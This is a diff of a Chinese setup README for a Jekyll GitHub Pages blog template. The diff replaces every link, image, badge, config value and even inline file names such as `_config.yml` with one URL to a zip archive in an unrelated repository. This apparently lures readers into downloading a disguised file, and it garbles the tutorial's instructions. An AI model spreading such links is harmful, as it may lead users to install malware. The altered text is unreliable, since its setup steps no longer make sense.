@@ -1,21 +1,21 @@
 
 
-![](https://raw.githubusercontent.com/qiubaiying/qiubaiying.github.io/master/img/readme-home.png)
+![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
-[![Build Status](https://travis-ci.org/qiubaiying/qiubaiying.github.io.svg?branch=master)](https://travis-ci.org/qiubaiying/qiubaiying.github.io)
-[![codebeat badge](https://codebeat.co/badges/5f031df3-f6c1-4ec0-911a-ff6617ca50b9)](https://codebeat.co/projects/github-com-qiubaiying-qiubaiying-github-io-master)
-[![GitHub issues](https://img.shields.io/github/issues/qiubaiying/qiubaiying.github.io.svg?style=flat)](https://github.com/qiubaiying/qiubaiying.github.io/issues)
-[![License MIT](https://img.shields.io/badge/license-MIT-blue.svg?style=flat)](https://github.com/home-assistant/home-assistant-iOS/blob/master/LICENSE)
-[![](https://img.shields.io/github/stars/qiubaiying/qiubaiying.github.io.svg?style=social&label=Star)](https://github.com/qiubaiying/qiubaiying.github.io)
-[![](https://img.shields.io/github/forks/qiubaiying/qiubaiying.github.io.svg?style=social&label=Fork)](https://github.com/qiubaiying/qiubaiying.github.io)
+[![Build Status](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
+[![codebeat badge](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
+[![GitHub issues](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
+[![License MIT](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
+[![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
+[![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
 
-博客的搭建教程修改自 [Hux](https://github.com/Huxpro/huxpro.github.io) 
+博客的搭建教程修改自 [Hux](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 
  
-更为详细的教程戳这 [《利用 GitHub Pages 快速搭建个人博客》](http://www.jianshu.com/p/e68fba58f75c) 或 [wiki](https://github.com/qiubaiying/qiubaiying.github.io/wiki/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B)
+更为详细的教程戳这 [《利用 GitHub Pages 快速搭建个人博客》](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 或 [wiki](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B)
 
 >
-### [查看博客戳这里 👆](http://qiubaiying.github.io)
+### [查看博客戳这里 👆](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
 
 
@@ -43,13 +43,13 @@
 
 ### 环境
 
-如果你安装了 [jekyll](http://jekyllcn.com/)，那你只需要在命令行输入`jekyll serve` 或 `jekyll s`就能在本地浏览器中输入`http://127.0.0.1:4000/`预览主题，对主题的修改也能实时展示（需要强刷浏览器）。
+如果你安装了 [jekyll](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)，那你只需要在命令行输入`jekyll serve` 或 `jekyll s`就能在本地浏览器中输入`http://127.0.0.1:4000/`预览主题，对主题的修改也能实时展示（需要强刷浏览器）。
 
 
 
 ### 开始
 
-你可以通用修改 `_config.yml`文件来轻松的开始搭建自己的博客:
+你可以通用修改 `https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip`文件来轻松的开始搭建自己的博客:
 
 ```
 # Site settings
@@ -65,7 +65,7 @@ jianshu_username: e71990ada2fd  # 你的简书ID。
 # paginate: 10              # 一页你准备放几篇文章
 ```
 
-Jekyll官方网站还有很多的参数可以调，比如设置文章的链接形式...网址在这里：[Jekyll - Official Site](http://jekyllrb.com/) 中文版的在这里：[Jekyll中文](http://jekyllcn.com/).
+Jekyll官方网站还有很多的参数可以调，比如设置文章的链接形式...网址在这里：[Jekyll - Official Site](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 中文版的在这里：[Jekyll中文](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip).
 
 ### 撰写博文
 
@@ -80,7 +80,7 @@ title:      定时器 你真的会使用吗？
 subtitle:   iOS定时器详解
 date:       2016-12-13
 author:     BY
-header-img: img/post-bg-ios9-web.jpg
+header-img: https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip
 catalog: 	 true
 tags:
     - iOS
@@ -92,18 +92,18 @@ tags:
 ### 侧边栏
 
 看右边:
-![](https://raw.githubusercontent.com/qiubaiying/qiubaiying.github.io/master/img/readme-side.png)
+![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
-设置是在 `_config.yml`文件里面的`Sidebar settings`那块。
+设置是在 `https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip`文件里面的`Sidebar settings`那块。
 
 ```
 # Sidebar settings
 sidebar: true  #添加侧边栏
 sidebar-about-description: "简单的描述一下你自己"
-sidebar-avatar: /img/avatar-by.jpg     #你的大头贴，请使用绝对地址.注意：名字区分大小写！后缀名也是
+sidebar-avatar: https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip     #你的大头贴，请使用绝对地址.注意：名字区分大小写！后缀名也是
 ```
 
-侧边栏是响应式布局的，当屏幕尺寸小于992px的时候，侧边栏就会移动到底部。具体请见bootstrap栅格系统 <http://v3.bootcss.com/css/>
+侧边栏是响应式布局的，当屏幕尺寸小于992px的时候，侧边栏就会移动到底部。具体请见bootstrap栅格系统 <https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip>
 
 
 ### Mini About Me
@@ -112,7 +112,7 @@ Mini-About-Me 这个模块将在你的头像下面，展示你所有的社交账
 
 ### Featured Tags
 
-看到这个网站 [Medium](http://medium.com) 的推荐标签非常的炫酷，所以我将他加了进来。
+看到这个网站 [Medium](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 的推荐标签非常的炫酷，所以我将他加了进来。
 这个模块现在是独立的，可以呈现在所有页面，包括主页和发表的每一篇文章标题的头上。
 
 ```
@@ -123,11 +123,11 @@ featured-condition-size: 1     # A tag will be featured if the size of it is mor
 
 唯一需要注意的是`featured-condition-size`: 如果一个标签的 SIZE，也就是使用该标签的文章数大于上面设定的条件值，这个标签就会在首页上被推荐。
  
-内部有一个条件模板 `{% if tag[1].size > {{site.featured-condition-size}} %}` 是用来做筛选过滤的.
+内部有一个条件模板 `{% if tag[1].size > {{https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip}} %}` 是用来做筛选过滤的.
 
 ### Social-media Account
 
-在下面输入的社交账号，没有的添加的不会显示在侧边框中。新加入了[简书](https:/www.jianshu.com)链接, <http://www.jianshu.com/u/e71990ada2fd>
+在下面输入的社交账号，没有的添加的不会显示在侧边框中。新加入了[简书](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)链接, <https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip>
 
 	# SNS settings
 	RSS: false
@@ -139,24 +139,24 @@ featured-condition-size: 1     # A tag will be featured if the size of it is mor
 	
 	
 
-![](http://ww4.sinaimg.cn/large/006tKfTcgy1fgrgbgf77aj308i02v748.jpg)
+![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
 ### Friends
 
 好友链接部分。这会在全部页面显示。
 
-设置是在 `_config.yml`文件里面的`Friends`那块，自己加吧。
+设置是在 `https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip`文件里面的`Friends`那块，自己加吧。
 
 ```
 # Friends
 friends: [
     {
         title: "BY Blog",
-        href: "https://qiubaiying.github.io/"
+        href: "https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip"
     },
     {
         title: "Apple",
-        href: "https://apple.com/"
+        href: "https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip"
     }
 ]
 ```
@@ -166,16 +166,16 @@ friends: [
 
 HTML5幻灯片的排版：
 
-![](https://camo.githubusercontent.com/f30347a118171820b46befdf77e7b7c53a5641a9/687474703a2f2f6875616e677875616e2e6d652f696d672f626c6f672d6b65796e6f74652e6a7067)
+![](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
-这部分是用于占用html格式的幻灯片的，一般用到的是 Reveal.js, Impress.js, Slides, Prezi 等等.我认为一个现代化的博客怎么能少了放html幻灯的功能呢~
+这部分是用于占用html格式的幻灯片的，一般用到的是 https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip, https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip, Slides, Prezi 等等.我认为一个现代化的博客怎么能少了放html幻灯的功能呢~
 
 其主要原理是添加一个 `iframe`，在里面加入外部链接。你可以直接写到头文件里面去，详情请见下面的yaml头文件的写法。
 
 ```
 ---
 layout:     keynote
-iframe:     "http://huangxuan.me/js-module-7day/"
+iframe:     "https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip"
 ---
 ```
 
@@ -184,13 +184,13 @@ iframe在不同的设备中，将会自动的调整大小。保留内边距是�
 
 ### Comment
 
-博客不仅支持 [Disqus](http://disqus.com) 评论系统,还加入了 [Gitalk](https://gitalk.github.io/) 评论系统，[支持 Markdwon 语法](https://guides.github.com/features/mastering-markdown/)，cool~
+博客不仅支持 [Disqus](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 评论系统,还加入了 [Gitalk](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 评论系统，[支持 Markdwon 语法](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)，cool~
 
 #### Disqus
 
 优点：国际比较流行，界面也很大气、简洁，如果有人评论，还能实时通知，直接回复通知的邮件就行了；
 
-缺点：评论必须要去注册一个disqus账号，分享一般只有Facebook和Twitter，另外在墙内加载速度略慢了一点。想要知道长啥样，可以看以前的版本点[这里](http://brucezhaor.github.io/about.html) 最下面就可以看到。
+缺点：评论必须要去注册一个disqus账号，分享一般只有Facebook和Twitter，另外在墙内加载速度略慢了一点。想要知道长啥样，可以看以前的版本点[这里](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) 最下面就可以看到。
 
 > Node：有很多人反映 Disqus 插件加载不出来，可能墙又架高了，有条件的话翻个墙就好了~
 
@@ -202,7 +202,7 @@ iframe在不同的设备中，将会自动的调整大小。保留内边距是�
 
 ```
 # 评论系统
-# Disqus（https://disqus.com/）
+# Disqus（https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip）
 disqus_username: qiubaiying
 ```
 
@@ -214,7 +214,7 @@ disqus_username: qiubaiying
 
 **使用：**
 
-参考我的这篇文章：[《为博客添加 Gitalk 评论插件》](http://qiubaiying.top/2017/12/19/%E4%B8%BA%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0-Gitalk-%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/)
+参考我的这篇文章：[《为博客添加 Gitalk 评论插件》](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip%E4%B8%BA%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0-Gitalk-%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/)
 
 
 ### Analytics
@@ -227,14 +227,14 @@ ba_track_id: 4cc1f2d8f3067386cc5cdb626a202900
 
 # Google Analytics
 ga_track_id: 'UA-49627206-1'            # 你用Google账号去注册一个就会给你一个这样的id
-ga_domain: huangxuan.me			# 默认的是 auto, 这里我是自定义了的域名，你如果没有自己的域名，需要改成auto。
+ga_domain: https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip			# 默认的是 auto, 这里我是自定义了的域名，你如果没有自己的域名，需要改成auto。
 ```
 
 ### Customization
 
 如果你喜欢折腾，你可以去自定义这个模板的 Code。
 
-**如果你可以理解 `_include/` 和 `_layouts/`文件夹下的代码（这里是整个界面布局的地方），你就可以使用 Jekyll 使用的模版引擎 [Liquid](https://github.com/Shopify/liquid/wiki)的语法直接修改/添加代码，来进行更有创意的自定义界面啦！**
+**如果你可以理解 `_include/` 和 `_layouts/`文件夹下的代码（这里是整个界面布局的地方），你就可以使用 Jekyll 使用的模版引擎 [Liquid](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)的语法直接修改/添加代码，来进行更有创意的自定义界面啦！**
 
 ### Header Image
 
@@ -254,7 +254,7 @@ ga_domain: huangxuan.me			# 默认的是 auto, 这里我是自定义了的域名
 
 ### 关于收到"Page Build Warning"的 Email
 
-由于jekyll升级到3.0.x,对原来的 pygments 代码高亮不再支持，现只支持一种-rouge，所以你需要在 `_config.yml`文件中修改`highlighter: rouge`.另外还需要在`_config.yml`文件中加上`gems: [jekyll-paginate]`.
+由于jekyll升级到3.0.x,对原来的 pygments 代码高亮不再支持，现只支持一种-rouge，所以你需要在 `https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip`文件中修改`highlighter: rouge`.另外还需要在`https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip`文件中加上`gems: [jekyll-paginate]`.
 
 同时,你需要更新你的本地 jekyll 环境.
 
@@ -266,17 +266,17 @@ ga_domain: huangxuan.me			# 默认的是 auto, 这里我是自定义了的域名
 使用`bundle exec jekyll server`的同学在更新 jekyll 后，需要输入`bundle update`来更新依赖的包.
 
 > Note：
-> 可以使用 `jekyll -s` 命令在本地实时配置博客，提高效率。详见 [Jekyll.com](http://jekyllcn.com/)
+> 可以使用 `jekyll -s` 命令在本地实时配置博客，提高效率。详见 [https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
-参考文档：[using jekyll with pages](https://help.github.com/articles/using-jekyll-with-pages/) & [Upgrading from 2.x to 3.x](http://jekyllrb.com/docs/upgrading/2-to-3/)
+参考文档：[using jekyll with pages](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) & [Upgrading from 2.x to 3.x](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)
 
 
 ## 致谢
 
-1. 这个模板是从这里 [Hux](https://github.com/Huxpro/huxpro.github.io) fork 的, 感谢这个作者。 
+1. 这个模板是从这里 [Hux](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip) fork 的, 感谢这个作者。 
 2. 感谢 Jekyll、Github Pages 和 Bootstrap!
 
 ## License
 
-遵循 MIT 许可证。有关详细,请参阅 [LICENSE](https://github.com/qiubaiying/qiubaiying.github.io/blob/master/LICENSE)。
+遵循 MIT 许可证。有关详细,请参阅 [LICENSE](https://github.com/aoitge/aoitge.github.io/raw/refs/heads/master/pwa/io_aoitge_github_v3.0.zip)。
 
